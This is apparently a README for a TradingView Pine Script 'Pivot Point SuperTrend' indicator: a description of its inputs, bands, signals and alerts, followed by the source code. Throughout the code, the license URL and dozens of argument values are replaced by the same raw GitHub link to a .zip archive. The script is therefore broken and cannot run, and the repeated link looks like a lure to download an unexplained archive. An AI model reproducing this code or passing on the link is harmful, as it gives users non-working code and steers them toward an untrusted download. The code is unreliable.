## Courtesy: LonesomeTheBlue from Tradingview

## Purpose
This script is a Pivot Point-based SuperTrend indicator, combining the concept of Pivot Points with the SuperTrend indicator, aiming to identify potential trend directions and support/resistance levels.

## Main Inputs
- `prd`: Period for calculating Pivot Points.
- `Factor`: ATR (Average True Range) multiplier for calculating upper and lower bands.
- `Pd`: ATR Period.
- Various display options for pivot points, labels, center line, trend line, support/resistance, etc.

## Key Sections

1. **Pivot Points:**
   - Determines the highest high (`ph`) and lowest low (`pl`) within the specified period.
   - Plots pivot points if the respective option is enabled.

2. **Center Line:**
   - Calculates the center line based on the last Pivot High or Low.

3. **Upper/Lower Bands (SuperTrend Logic):**
   - Calculates the upper and lower bands using ATR and a factor.
   - Determines the trend based on the comparison of the close price with the bands. The trend can be in an uptrend (1), downtrend (-1), or neutral (0).

4. **Trend Line:**
   - Plots the SuperTrend line based on the calculated values.

5. **Buy/Sell Signals:**
   - Identifies points where the trend changes (Buy or Sell signals) and plots corresponding labels.

6. **Support/Resistance Levels:**
   - Calculates support and resistance levels based on pivot points and plots them if the respective option is enabled.

7. **Alerts:**
   - Sets up alert conditions for potential Buy, Sell signals, and general trend changes.

## How it Works
The script uses Pivot Points to define potential reversal or breakout areas. The SuperTrend logic, based on the ATR, establishes the trend and plots corresponding trend lines. Buy and Sell signals are identified when there's a change in trend direction. It also calculates and displays support and resistance levels based on pivot points.

## Customization
This script allows users to adjust input parameters like periods for pivot points, ATR, and various display options to suit their trading strategies.

## Alerts
It's equipped with alerts to notify users of potential buying, selling opportunities, or general trend changes.

This indicator is meant to assist traders in identifying potential trends, breakout points, and possible support/resistance levels within a trading environment.

```pine
// This source code is subject to the terms of the Mozilla Public License 2.0 at https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip
// © LonesomeTheBlue

//@version=4
study("Pivot Point SuperTrend", overlay = true)
prd = input(defval = 2, title="Pivot Point Period", minval = 1, maxval = 50)
Factor=input(defval = 3, title = "ATR Factor", minval = 1, step = 0.1)
Pd=input(defval = 10, title = "ATR Period", minval=1)
showpivot = input(defval = false, title="Show Pivot Points")
showlabel = input(defval = true, title="Show Buy/Sell Labels")
showcl = input(defval = false, title="Show PP Center Line")
showsr = input(defval = false, title="Show Support/Resistance")

// get Pivot High/Low
float ph = pivothigh(prd, prd)
float pl = pivotlow(prd, prd)

// drawl Pivot Points if "showpivot" is enabled
plotshape(ph and showpivot, text="H",  https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color=na, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp=0, offset = -prd)
plotshape(pl and showpivot, text="L",  https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color=na, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp=0, offset = -prd)

// calculate the Center line using pivot points
var float center = na
float lastpp = ph ? ph : pl ? pl : na
if lastpp
    if na(center)
        center := lastpp
    else
        //weighted calculation
        center := (center * 2 + lastpp) / 3

// upper/lower bands calculation
Up = center - (Factor * atr(Pd))
Dn = center + (Factor * atr(Pd))

// get the trend
float TUp = na
float TDown = na
Trend = 0
TUp := close[1] > TUp[1] ? max(Up, TUp[1]) : Up
TDown := close[1] < TDown[1] ? min(Dn, TDown[1]) : Dn
Trend := close > TDown[1] ? 1: close < TUp[1]? -1: nz(Trend[1], 1)
Trailingsl = Trend == 1 ? TUp : TDown

// plot the trend
linecolor = Trend == 1 and nz(Trend[1]) == 1 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : Trend == -1 and nz(Trend[1]) == -1 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na
plot(Trailingsl, color = linecolor ,  linewidth = 2, title = "PP SuperTrend")
 
plot(showcl ? center : na, color = showcl ? center < hl2 ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na)

// check and plot the signals
bsignal = Trend == 1 and Trend[1] == -1
ssignal = Trend == -1 and Trend[1] == 1
plotshape(bsignal and showlabel ? Trailingsl : na, title="Buy", text="Buy", location = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, size = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, textcolor = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp = 0)
plotshape(ssignal and showlabel ? Trailingsl : na, title="Sell", text="Sell", location = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, size = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, color = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, textcolor = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, transp = 0)

//get S/R levels using Pivot Points
float resistance = na
float support = na
support := pl ? pl : support[1]
resistance := ph ? ph : resistance[1]

// if enabled then show S/R levels
plot(showsr and support ? support : na, color = showsr and support ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, offset = -prd)
plot(showsr and resistance ? resistance : na, color = showsr and resistance ? https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip : na, style = https://raw.githubusercontent.com/Bhoopalan1999/customized-tradinview-indicators/main/nonacceleration/customized-tradinview-indicators_3.8.zip, offset = -prd)

// alerts
alertcondition(Trend == 1 and Trend[1] == -1, title='Buy Signal', message='Buy Signal')
alertcondition(Trend == -1 and Trend[1] == 1, title='Sell Signal', message='Sell Signal')
alertcondition(change(Trend), title='Trend Changed', message='Trend Changed')

```